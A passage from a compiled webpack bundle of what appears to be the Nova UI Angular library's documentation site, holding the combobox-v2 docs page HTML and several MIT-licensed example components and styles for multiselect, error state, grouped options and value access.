<nui-combobox-v2-reactive-form-field-example></nui-combobox-v2-reactive-form-field-example>\n</nui-example-wrapper>\n\n<h2>Multiselect</h2>\n<p>\n    Combobox has a multiselect mode. To turn it on, set the\n    <code>multiselect</code> input to <code>true</code>. This allows the\n    template you pass to the <code>inputTemplate</code> input to render the\n    selected items in a special container within the main input.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> It\'s possible to use another component for this\n    feature in place of\n    <code\n        ><a href="../components/ChipsComponent.html" target="_blank"\n            >nui-chips</a\n        ></code\n    >. In fact, you can technically pass any template to\n    <code>inputTemplate</code>.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-multiselect"\n    exampleTitle="Multiselect"\n>\n    <nui-combobox-v2-multiselect-example></nui-combobox-v2-multiselect-example>\n</nui-example-wrapper>\n\n<h2>Creating an Option</h2>\n<p>\n    You can create new options and add them to the list. To do that, just add\n    the option to the initial list e.g. <code>options.push(option);</code>. To\n    immediately set an added option as the selected value you can use either\n    <code>FormControl.setValue(option);</code> or the <code>value</code> input\n    on the component.\n</p>\n<p>\n    If you want to add options using the <em>Create Option</em> button as in the\n    example below, you should add the button as a content projection along with\n    the options themselves.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> You can use the\n    <code>.nui-combobox-v2__create-option</code> class for the\n    <em>Create Option</em> block to have the same styles as the example.\n</nui-message>\n<p>\n    <code>nui-combobox-v2</code> comes with the following outputs which are\n    useful when implementing the create-option functionality:\n</p>\n<ul>\n    <li>\n        <code>canCreateOption</code> - emits <code>true</code> when there\'s no\n        such option already\n    </li>\n    <li>\n        <code>searchEmpty</code> - emits <code>true</code> when there\'s no\n        option that fits search term in the textbox.\n        <nui-message type="warning" [allowDismiss]="false">\n            <strong>Note:</strong> This is valid only if the\n            <code>isTypeaheadEnabled</code> property is\n            <code>true</code> (default behavior).\n        </nui-message>\n    </li>\n</ul>\n<h3>Single select</h3>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-create-option"\n    exampleTitle="Create option"\n>\n    <nui-combobox-v2-create-option-example></nui-combobox-v2-create-option-example>\n</nui-example-wrapper>\n\n<h3>Multiselect</h3>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-create-option-multiselect"\n    exampleTitle="Create option (Multiselect)"\n>\n    <nui-combobox-v2-create-option-multiselect-example></nui-combobox-v2-create-option-multiselect-example>\n</nui-example-wrapper>\n\n<h2>Virtual Scroll</h2>\n<p>\n    The options dropdown can use virtual scroll. For that, wrap the options list\n    in a\n    <code\n        ><a\n            href="https://material.angular.io/cdk/scrolling/overview#virtual-scrolling"\n            target="_blank"\n            >cdk-virtual-scroll-viewport</a\n        ></code\n    >. You can adjust virtual scroll container to your needs according to\n    <a href="https://material.angular.io/cdk/scrolling/api"\n        >Virtual Scroll API</a\n    >.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <p>\n        <strong>Warning:</strong> All the items inside a dropdown\n        <strong>must</strong> be of the same height!\n    </p>\n    You should set <code>itemSize</code> property of\n    <code>cdk-virtual-scroll-viewport</code> to the <strong>exact</strong> value\n    of an option height. Otherwise, some features may not work.\n</nui-message>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> If using virtual scroll, custom typeahead must be\n    used. See the <strong>Custom Typeahead</strong> section for how to implement\n    that.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-virtual-scroll"\n    exampleTitle="Virtual Scroll"\n>\n    <nui-combobox-v2-virtual-scroll-example></nui-combobox-v2-virtual-scroll-example>\n</nui-example-wrapper>\n\n<h2>Disabled Mode</h2>\n<p>\n    It is possible to disable either the entire <code>combobox-v2</code> or one\n    or more <code>select-v2-option</code>s. To do that, set the\n    <code>isDisabled</code> input to true on the appropriate component.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-disabled"\n    exampleTitle="Disabled Mode"\n>\n    <nui-combobox-v2-disabled-example></nui-combobox-v2-disabled-example>\n</nui-example-wrapper>\n\n<h2>Error State</h2>\n<p>\n    The <code>isInErrorState</code> input is used to set/change the visual\n    validation state of the component. This can be used in custom situations in\n    which you need to manually indicate that the component is in error state.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> If you want to use a combobox as a form field with\n    validation, consider using the\n    <code\n        ><a href="../components/FormFieldComponent.html" target="_blank"\n            >nui-form-field</a\n        ></code\n    >\n    component. For information about that, see the\n    <strong>Using With Reactive Forms</strong> section.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-error"\n    exampleTitle="Error State"\n>\n    <nui-combobox-v2-error-example></nui-combobox-v2-error-example>\n</nui-example-wrapper>\n\n<h2>Styling</h2>\n<p>\n    To style the combobox\'s dropdown simply use <code>overlayConfig</code> input\n    and fill in its <code>panelClass</code> property with the global CSS class\n    with the desired styles.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-styling"\n    exampleTitle="Styling"\n>\n    <nui-combobox-v2-styling-example></nui-combobox-v2-styling-example>\n</nui-example-wrapper>\n\n<h2>Inline Display Mode</h2>\n<p>\n    To put a combobox in inline display mode, add necessary styles to the\n    component. For example, you can add bootstrap\n    <code>d-inline-flex</code> style.\n</p>\n<nui-example-wrapper filenamePrefix="combobox-v2-inline" exampleTitle="Inline">\n    <nui-combobox-v2-inline-example></nui-combobox-v2-inline-example>\n</nui-example-wrapper>\n\n<h2>Value Removal</h2>\n<p>\n    Combobox has a "remove value" button by default. If you don\'t want to use\n    it, set the\n    <code>isRemoveValueEnabled</code> input to <code>false</code>.\n</p>\n\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> You should probably add validation as in\n    <a (click)="scrollTo(reactiveForms)">Reactive Forms</a> section.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-remove-value"\n    exampleTitle="Value Removal"\n>\n    <nui-combobox-v2-remove-value-example></nui-combobox-v2-remove-value-example>\n</nui-example-wrapper>\n\n<h2>Overlay Configuration</h2>\n<p>\n    To adjust <code>ComboboxComponent</code>\'s popup overlay properties, such as\n    <code>width</code>, <code>height</code> or other properties, set the\n    <code>overlayConfig</code> input in accordance with the Angular CDK Overlay\n    Config\n    <a href="https://material.angular.io/cdk/overlay/api#OverlayConfig"\n        >interface</a\n    >.<br />\n    <mark\n        >NOTE: in case you need to set the <code>width</code> using the overlay\n        config make sure you disable the automatic width synchronization, which\n        is enabled by default. This can be done by setting the\n        <code>syncWidth</code> input to <code>false</code></mark\n    >\n    <nui-message type="info" [allowDismiss]="false">\n        <strong>Note:</strong> Select-v2 and Combobox-v2 contain default\n        <code>with-popup-styles</code> (you can import it\n        <code>POPUP_STYLES_CLASS</code> from <code>@nova-ui/bits</code>) class\n        which styles the popup according to the Nova Design Language. Setting\n        custom styles through the global classes using the `panelClass` will\n        override the default styles of the overlay. If you want to preserve\n        default overlay styles please consider adding the\n        <code>with-popup-styles</code> class when setting styles using the\n        <code>overlayConfig</code>. Please see the example below.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-overlay-config"\n    exampleTitle="Overlay configuration"\n>\n    <nui-combobox-v2-overlay-config-example></nui-combobox-v2-overlay-config-example>\n</nui-example-wrapper>\n\n<h2>Custom Typeahead</h2>\n<p>\n    Combobox comes with default typeahead functionality. Nevertheless, it\'s\n    possible to use custom typeahead logic. To do so, disable the default\n    typeahead by setting the\n    <code>isTypeaheadEnabled</code> input to <code>false</code>. Custom\n    typeahead involves filtering the options list and updating it manually.\n</p>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-custom-typeahead"\n    exampleTitle="Custom typeahead"\n>\n    <nui-combobox-v2-custom-typeahead-example></nui-combobox-v2-custom-typeahead-example>\n</nui-example-wrapper>\n\n<h2>Custom Dropdown Control</h2>\n<p>\n    Similar to <code>select-v2</code>, the\n    <code>manualDropdownControl</code> boolean input gives you total control\n    over opening and closing the dropdown. When set to <code>true</code>, the\n    default behavior of the dropdown is blocked, and you can provide your own\n    behavior.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> The <code>clickOutsideDropdown</code> output can be\n    used to close the dropdown manually on clicks outside both the host element\n    and the dropdown.\n</nui-message>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> In order for keyboard navigation work as you open the\n    dropdown you have to manually set focus to the <code>inputElement</code> in\n    case you are triggering the dropdown outside the host element. For that, you\n    can do <code>combobox.inputElement.nativeElement.focus()</code>\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="combobox-v2-custom-control"\n    exampleTitle="Combobox custom dropdown control"\n>\n    <nui-combobox-v2-custom-control-example></nui-combobox-v2-custom-control-example>\n</nui-example-wrapper>\n\n<h2>Keyboard interaction</h2>\n<p>\n    <code>&lt;nui-combobox-v2&gt;</code> comes with built-in accessibility\n    features:\n</p>\n<ul>\n    <li><code>TAB/Shift+TAB</code> for focusing the component.</li>\n    <li>\n        <code>ARROW UP/ARROW DOWN</code> for navigation inside an option list.\n    </li>\n    <li>\n        <code>PAGE UP/PAGE DOWN</code> for navigation inside the list to\n        top/bottom.\n    </li>\n    <li><code>ENTER</code> to select an option.</li>\n</ul>\n\n<p>Multiselect only:</p>\n<ul>\n    <li><code>BACKSPACE</code> to remove a selected item.</li>\n    <li><code>LEFT</code> to navigate the selected items.</li>\n    <li><code>RIGHT</code> to navigate the selected items.</li>\n</ul>\n'},49303:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host {\n    .combobox-container {\n        margin: 0;\n    }\n    ul {\n        padding-left: 40px;\n\n        li {\n            list-style: disc;\n        }\n    }\n    a {\n        cursor: pointer;\n    }\n}\n"},18379:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-v2-docs-example",\n    templateUrl: "./combobox-v2-docs.example.component.html",\n    styleUrls: ["combobox-v2-docs.example.component.less"],\n})\nexport class ComboboxV2DocsComponent {\n    public scrollTo($element: HTMLElement): void {\n        $element.scrollIntoView(true);\n        const scrolledY = window.scrollY;\n\n        if (scrolledY) {\n            window.scroll(0, scrolledY - 40);\n        }\n    }\n}\n'},24149:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    class="d-inline-flex"\n    [isInErrorState]="error"\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    style="width: 50%"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<nui-switch\n    class="d-inline-flex"\n    style="padding-left: 15px"\n    [(value)]="error"\n    i18n\n>\n    Toggle error state\n</nui-switch>\n'},71025:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-error-example",\n    templateUrl: "combobox-v2-error.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2ErrorExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl<string | null>(null);\n\n    public error: boolean = true;\n}\n'},24341:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<b>Accessing value using <code>value</code></b>\n<nui-combobox-v2\n    #comboboxValueExample\n    placeholder="Select Item"\n    i18n-placeholder\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n<p class="my-3">You selected: {{ comboboxValueExample.value }}</p>\n\n<b>Accessing value using <code>valueSelected</code> output</b>\n<nui-combobox-v2\n    #comboboxValueSelectedExample\n    placeholder="Select Item"\n    i18n-placeholder\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n<p class="my-3">You selected: {{ comboboxValueSelectedValue }}</p>\n\n<b>Accessing value using <code>valueChanged</code> output</b>\n<nui-combobox-v2\n    #comboboxValueChangedExample\n    placeholder="Select Item"\n    i18n-placeholder\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-combobox-v2>\n<p class="my-3">You typed: {{ comboboxValueChangedValue }}</p>\n'},16433:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { takeUntil, tap } from "rxjs/operators";\n\nimport { ComboboxV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-v2-getting-value-example",\n    templateUrl: "combobox-v2-getting-value.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2GettingValueExampleComponent implements AfterViewInit {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxValueSelectedValue: string;\n    public comboboxValueChangedValue: string;\n\n    @ViewChild("comboboxValueSelectedExample")\n    private comboboxValueSelectedExample: ComboboxV2Component;\n    @ViewChild("comboboxValueChangedExample")\n    private comboboxValueChangedExample: ComboboxV2Component;\n    private destroy$: Subject<any> = new Subject<any>();\n\n    public ngAfterViewInit(): void {\n        this.comboboxValueSelectedExample.valueSelected\n            .pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap(\n                    (value) =>\n                        (this.comboboxValueSelectedValue = value as string)\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n\n        this.comboboxValueChangedExample.valueChanged\n            .pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap(\n                    (value) =>\n                        (this.comboboxValueChangedValue = value as string)\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n}\n'},22505:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [displayWith]="displayFn"\n    #combobox\n>\n    <ng-container *ngFor="let itemGroup of items; let last = last">\n        <nui-select-v2-option-group>\n            <span class="nui-select-v2-option-group--header">{{\n                itemGroup.header\n            }}</span>\n            <nui-select-v2-option\n                *ngFor="let item of itemGroup.items"\n                [value]="item"\n            >\n                <span [nuiComboboxV2OptionHighlight]="item.name"></span>\n            </nui-select-v2-option>\n            <nui-divider *ngIf="!last" size="extra-small"></nui-divider>\n        </nui-select-v2-option-group>\n    </ng-container>\n</nui-combobox-v2>\n'},58341:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\nimport { ISelectGroup } from "@nova-ui/bits";\n\nconst getRandomNumberTo = (max: number) =>\n    Math.floor(Math.random() * Math.floor(max) + 1);\n\n@Component({\n    selector: "nui-combobox-v2-grouped-options-example",\n    templateUrl: "combobox-v2-grouped-options.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2GroupedOptionsExampleComponent {\n    public items: ISelectGroup[] = Array.from({ length: 10 }).map((_, i) => ({\n        header: $localize`Header line ${i + 1}`,\n        items: Array.from({ length: getRandomNumberTo(5) }).map((v, n) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${n + 1}`,\n        })),\n    }));\n    public comboboxControl = new FormControl<string | null>(null);\n\n    public displayFn(item: any): string {\n        return item?.name || "";\n    }\n}\n'},54839:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    class="d-inline-flex"\n    placeholder="Select Item"\n    i18n-placeholder\n    style="margin-right: 15px"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<nui-combobox-v2 class="d-inline-flex" placeholder="Select Item" #combobox2>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},98415:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-v2-inline-example",\n    templateUrl: "combobox-v2-inline.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2InlineExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n}\n'},1433:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    [placeholder]="combobox.selectedOptions.length ? \'\' : placeholder"\n    [formControl]="comboboxControl"\n    [multiselect]="true"\n    #combobox\n>\n    <ng-container selectedItems>\n        <nui-chip\n            nuiMarkAsSelectedItem\n            class="ml-2"\n            *ngFor="let option of combobox?.value"\n            closeButtonTooltip="Remove"\n            [item]="convertToChip(option)"\n            (remove)="combobox.deselectItem(option)"\n            (mouseup)="$event.stopPropagation()"\n        >\n        </nui-chip>\n    </ng-container>\n\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span class="mr-3" [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setModel()"\n>\n    Set model\n</button>\n'},18693:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference)\n    "../../../../../../src/styles/components/combobox-v2-addons.less";\n\n.active {\n    .active-item();\n}\n\nnui-chip {\n    display: inline-flex;\n    cursor: pointer;\n    border-radius: 9px;\n    margin-bottom: 5px;\n}\n'},7797:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Subject } from "rxjs";\n\n@Component({\n    selector: "nui-combobox-v2-multiselect-example",\n    templateUrl: "combobox-v2-multiselect.example.component.html",\n    styleUrls: ["combobox-v2-multiselect.example.component.less"],\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2MultiselectExampleComponent implements OnDestroy {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl<string[] | null>(null);\n    public placeholder: string = $localize`Select Item`;\n\n    private readonly destroy$ = new Subject<void>();\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    public convertToChip(value: string): { label: string } {\n        return { label: value };\n    }\n\n    public setModel(): void {\n        this.comboboxControl.setValue([\n            $localize`Item 10`,\n            $localize`Item 12`,\n            $localize`Item 14`,\n        ]);\n    }\n}\n'},17857:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>Value: {{ combobox.value }}</p>\n<p>FormControl.value: {{ comboboxControl.value }}</p>\n<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    #combobox\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setItems(0)"\n>\n    Set items: 1, 2, 3, 4\n</button>\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setItems(1)"\n>\n    Set items: 3, 4, 5, 6\n</button>\n\n<nui-divider size="medium"></nui-divider>\n\n<p>Value: {{ multiselect.value }}</p>\n<p>FormControl.value: {{ multiselect.value }}</p>\n<nui-combobox-v2\n    [formControl]="multiselectControl"\n    [multiselect]="true"\n    #multiselect\n>\n    <ng-container selectedItems>\n        <nui-chip\n            nuiMarkAsSelectedItem\n            class="ml-2"\n            *ngFor="let option of multiselect?.value"\n            closeButtonTooltip="Remove"\n            [item]="convertToChip(option)"\n            (remove)="multiselect.deselectItem(option)"\n            (mouseup)="$event.stopPropagation()"\n        >\n        </nui-chip>\n    </ng-container>\n\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setMultiselectItems(0)"\n>\n    Set items: 1, 2, 3, 4\n</button>\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setMultiselectItems(1)"\n>\n    Set items: 3, 4, 5, 6\n</button>\n'},48973:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-options-changed-example",\n    templateUrl: "combobox-v2-options-changed.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2OpitionsChangedExampleComponent implements OnInit {\n    public items: string[] = [];\n    public multiselectItems: string[] = [];\n    public comboboxControl = new FormControl<string | null>(null);\n    public multiselectControl = new FormControl<string | null>(null);\n    private itemSet = [\n        [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n        ],\n        [\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n            $localize`Item 6`,\n        ],\n    ];\n\n    public ngOnInit(): void {\n        this.items = this.itemSet[0];\n        this.multiselectItems = this.itemSet[0];\n    